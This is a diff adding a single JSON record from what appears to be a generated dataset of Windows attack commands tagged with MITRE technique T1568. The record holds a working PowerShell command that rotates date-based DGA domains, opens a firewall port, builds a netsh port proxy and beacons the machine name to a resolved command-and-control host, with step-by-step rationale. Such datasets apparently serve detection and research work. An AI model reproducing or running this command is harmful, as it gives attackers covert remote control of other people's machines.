@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='svc';$date=(Get-Date -Format 'yyyyMMdd');$dgad=1..20|%{($seed+$_+$date+'.net')};foreach($d in $dgad){try{$a=Resolve-DnsName -Name $d -Type A -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=4433 2>$null;netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=4433 connectaddress=$ip connectport=443;netsh advfirewall firewall add rule name='c2_4433' dir=in action=allow protocol=TCP localport=4433;Invoke-WebRequest -Uri 'http://127.0.0.1:4433/beacon' -UseBasicParsing -Headers @{XNode=$env:COMPUTERNAME;XDom=$d} -TimeoutSec 5;break}catch{}}",
+  "explanation": "Generates a date-seeded DGA domain list, resolves until one returns an A record, then sets a local portproxy to the resolved IP and beacons via the proxy on a non-standard port.",
+  "rationale_steps": [
+    "Create DGA domains tied to current date to enable dynamic rotation.",
+    "Resolve to obtain a current fast-flux IP and configure netsh portproxy for C2 reachability."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-ea20b44b",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
